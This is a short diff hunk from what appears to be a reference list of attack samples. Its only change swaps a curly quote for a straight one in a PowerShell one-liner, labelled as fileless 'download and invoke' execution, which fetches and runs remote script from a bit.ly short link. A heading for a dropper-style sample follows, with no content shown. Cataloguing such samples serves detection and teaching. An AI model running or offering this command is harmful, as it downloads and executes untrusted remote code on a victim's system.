@@ -11,7 +11,7 @@ Referenced Samples:
 
 L1 - Example of fileless execution/download and invoke code.
 	
-	powershell.exe -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3l36xdO')”
+	powershell.exe -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3l36xdO')"
 
 
 L2 - 2 Stage traditional dropper style command
